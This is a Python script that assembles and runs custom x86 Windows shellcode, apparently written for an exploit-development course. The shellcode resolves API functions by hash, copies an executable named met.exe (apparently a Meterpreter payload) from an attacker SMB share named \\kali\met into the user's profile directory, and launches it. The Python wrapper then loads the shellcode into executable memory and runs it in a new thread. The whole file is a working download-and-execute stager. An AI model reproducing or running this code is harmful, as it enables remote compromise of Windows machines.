import ctypes, struct
from keystone import *

# Using GetUserProfileDirectoryA

CODE = (
   ###### BEGIN COMMON PART FROM MATERIALS ######
    " start:                             "
    # "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage

    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage

    ###### END COMMON PART FROM MATERIALS ######



    ###### LOADING CUSTOM FUNCTIONS FROM KERNEL32.DLL ######
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage

    "   push  0xcb73463b                ;"  #   lstrcatA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save lstrcatA address for later usage

    "   push  0xa4048954                ;"  #   MoveFileA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x20], eax           ;"  #   Save MoveFileA address for later usage


    ###### LOADING CUSTOM FUNCTIONS FROM USERENV.DLL ######
    " load_userenv:                      "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   mov   al, 0x6c                  ;"
    "   shl   eax, 0x10                 ;"
    "   mov   ax, 0x6c64                ;"
    "   push  eax                       ;"
    "   push  0x2e766e65                ;"
    "   push  0x72657375                ;"
    "   push  esp                       ;"  #   Push "userenv.dll"
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA

    " resolve_symbols_userenv:           "
    "   mov   ebx, eax                  ;"  #   Use userenv.dll

    "   push  0xf2ea3914                ;"  #   GetUserProfileDirectoryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x24], eax           ;"  #   Save GetUserProfileDirectoryA address for later usage


    ###### LOADING CUSTOM FUNCTIONS FROM ADVAPI32.DLL ######
    " load_advapi32:                     "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   push  eax                       ;"
    "   push  0x6c6c642e                ;"
    "   push  0x32336970                ;"
    "   push  0x61766461                ;"
    "   push  esp                       ;"  #   Push "advapi32.dll"
    "   call  dword ptr [ebp+0x14]      ;"  #   Call LoadLibraryA

    " resolve_symbols_advapi32:          "
    "   mov   ebx, eax                  ;"  #   Use advapi32.dll

    "   push  0x591ea70f                ;"  #   OpenProcessToken hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x28], eax           ;"  #   Save OpenProcessToken address for later usage


    ###### NOW THAT ALL DLL AND FUNCTIONS ARE LOADED, WE CAN CALL EACH FUNCTION

    " allocate_space_destination:        "
    "   mov   ebx, esp                  ;"  #   Save EBX = ESP
    "   add   esp, 0xffffff10           ;"  #   Avoid NULL bytes

    " call_OpenProcessToken:             "
    "   add   esp, 0xfffffff0           ;"  #   Avoid NULL bytes
    "   mov   esi, esp                  ;"  #   Save ESI = ESP
    "   push  esi                       ;"  #   Push TokenHandle
    "   xor   ecx, ecx                  ;"
    "   inc   ecx                       ;"
    "   shl   ecx, 0x03                 ;"  #
    "   push  ecx                       ;"  #   Push DesiredAccess = 0x08
    "   push  0xffffffff                ;"  #   Push ProcessHandle
    "   call  dword ptr [ebp+0x28]      ;"  #   Call OpenProcessToken

    ###### STORE USER PATH INTO EBX
    " call_GetUserProfileDirectoryA:     "
    "   xor eax, eax                    ;"
    "   inc eax                         ;"
    "   shl eax, 0x7                    ;"  #   EAX = 0x80
    "   push eax                        ;"  #   Push lpcchSize value
    "   push esp                        ;"  #   Push lpcchSize address
    "   push ebx                        ;"  #   Push destination buffer
    "   mov esi, [esi]                  ;"  #   Dereferencing the handler pointer
    "   push esi                        ;"  #   Push handler
    "   call dword ptr [ebp+0x24]       ;"  #   Call GetUserProfileDirectoryA

    ###### CONCAT USER PATH AND "\met.exe"
    " call_lstrcatA:                     "
    "   xor  eax,eax                     ;"
    "   push eax                        ;"
    "   push 0x6578652e                 ;"
    "   push 0x74656d5c                 ;"
    "   push esp                        ;"  #   Push "\met.exe"
    "   push ebx                        ;"  #   Push destination
    "   call dword ptr [ebp+0x1C]       ;"  #   Call lstrcatA

    ###### MOVE FILE FROM SMB
    " call_MoveFileA:                    "
    "   xor   eax,eax                   ;"  #   NULL eax
    "   mov   ax, 0x6578                ;"  #   xe\00\00
    "   push  eax                       ;"
    "   push  0x652e7465                ;"
    "   push  0x6d5c7465                ;"
    "   push  0x6d5c696c                ;"
    "   push  0x616b5c5c                ;"  #   ESP = "\\kali\met\met.exe" SHELLCODE BY T A M A R I S K
    "   lea   esi, [esp]                ;"  #   Save ESP in ESI
    "   push  ebx                       ;"  #   Push destination path
    "   push  esi                       ;"  #   Push SMB path
    "   call  dword ptr [ebp+0x20]      ;"  #   Call MoveFileA

    ####### BASED ON MATERIALS, ALL VALUES TO 0 ######
    " create_startupinfoa:               "
    "   xor   eax,eax                   ;"  #   NULL EAX
    "   push  eax                       ;"  #   Push hStdError
    "   push  eax                       ;"  #   Push hStdOutput
    "   push  eax                       ;"  #   Push hStdInput
    "   push  eax                       ;"  #   Push lpReserved2
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
    "   push  eax                       ;"  #   Push dwFlags
    "   push  eax                       ;"  #   Push dwFillAttribute
    "   push  eax                       ;"  #   Push dwYCountChars
    "   push  eax                       ;"  #   Push dwXCountChars
    "   push  eax                       ;"  #   Push dwYSize
    "   push  eax                       ;"  #   Push dwXSize
    "   push  eax                       ;"  #   Push dwY
    "   push  eax                       ;"  #   Push dwX
    "   push  eax                       ;"  #   Push lpTitle
    "   push  eax                       ;"  #   Push lpDesktop
    "   push  eax                       ;"  #   Push lpReserved
    "   mov   al, 0x44                  ;"  #   Push size
    "   push  eax                       ;"  #   Push cb
    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI

    ####### BASED ON MATERIALS ######
    " call_createprocessa:               "
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpProcessInformation
    "   push  edi                       ;"  #   Push lpStartupInfo
    "   xor   eax, eax                  ;"  #   Null EAX   
    "   push  eax                       ;"  #   Push lpCurrentDirectory
    "   push  eax                       ;"  #   Push lpEnvironment
    "   push  eax                       ;"  #   Push dwCreationFlags
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
    "   push  eax                       ;"  #   Push bInheritHandles
    "   dec   eax                       ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpThreadAttributes
    "   push  eax                       ;"  #   Push lpProcessAttributes
    "   push  ebx                       ;"  #   Push lpCommandLine = destination
    "   push  eax                       ;"  #   Push lpApplicationName
    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA

    ###### EXIT PROPERLY ACCORDING TO MATERIALS ######
    " exit_properly:                     "
    "   xor   ecx, ecx                  ;"  #   NULL ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)


sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
